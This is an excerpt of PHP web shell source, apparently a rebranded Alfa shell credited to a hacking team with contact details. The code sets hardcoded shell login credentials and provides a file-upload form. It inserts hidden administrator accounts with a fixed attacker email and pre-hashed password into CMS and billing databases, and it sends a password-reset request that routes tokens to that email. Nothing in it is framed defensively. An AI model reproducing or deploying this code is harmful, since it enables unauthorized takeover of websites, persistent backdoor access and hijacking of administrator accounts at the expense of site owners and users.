...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'haxorstars',
    'password' => '936bed245510a8da696bbf93309e7a2a',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
<font color='#00A220'>Contact : zxzxrc4@gmail.com</font><br>
...
$create = "insert into tblclients (email) values('zxzxrc4@gmail.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=zxzxrc4@gmail.com");
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Rebirth Haxor Team &copy; 2016-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>zxzxrc4@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/penguinsalju'>@penguinsalju</a></span></div></td>
</tr>
</table>
</div>
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'zxzxrc4@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','zxzxrc4@gmail.com','filtered_html','1','Europe/Berlin','zxzxrc4@gmail.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','zxzxrc4@gmail.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
